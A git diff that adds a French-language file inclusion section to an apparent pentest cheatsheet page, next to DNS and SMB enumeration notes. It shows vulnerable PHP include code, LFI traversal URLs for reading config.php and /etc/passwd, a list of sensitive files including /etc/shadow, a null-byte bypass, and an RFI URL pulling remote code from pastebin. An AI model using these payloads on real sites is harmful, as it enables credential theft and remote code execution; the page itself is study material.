@@ -15,6 +15,10 @@ permalink: /cheatseet/
   * [Services enumerations](#services)
     * [53 - DNS](#dns)
     * [139/445 - SMB](#smb)
+### [Web vulnerabilities](#web)
+ * [File Inclusion](#file-inclusion)
+   * [LFI (Local File Inclusion)](#lfi)
+   * [RFI (Remote File Inclusion)](#rfi)
 
 ## Common tools for network discovery <a name="network-discovery"></a>
 In this chapter, the most common tools and commands use to dicover network architecture are presented. 
@@ -60,3 +64,47 @@ SMB Commands :
 
 ```smbget -U guest -R smb://192.168.X.X/share ``` Télécharge les fichiers sur un serveur SMB
 
+## File Inclusion <a name="file-inclusion"></a>
+
+### LFI (Local File Inclusion) <a name="lfi"></a>
+
+Vulnérabilité permettant l'inclusion de fichier local.
+
+Exemple de LFI :
+
+```php
+<?php @include("./page/".$_GET['page']) ?>
+```
+
+```https://fhbapt.github.io/?page=index.php``` Récupération du fichier index.php
+
+```https://fhbapt.github.io/?page=../config.php``` Récupération du fichier config.php
+
+```https://fhbapt.github.io/?page=./../../../etc/password``` Recupération du fichier password
+
+Les fichiers intéressants :
+ * /etc/passwd
+ * /etc/shadow
+ * /etc/hosts
+ * /etc/group
+ * /proc/cmdline
+ * Fichiers de logs
+ * Fichiers de backups
+
+Null Byte, Double encoding :
+
+```https://fhbapt.github.io/?page=etc/password%00``` Null Byte : %00
+
+### RFI (Remote File Inclusion) <a name="rfi"></a>
+
+Vulnérabilité permettant l'inclusion de fichier distant.
+
+Exemple de RFI :
+
+```php
+<?php @include($_GET['page']) ?>
+```
+
+Utilisation de pastbin pour émuler le serveur et inclure le code du pastbin:
+
+```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` 
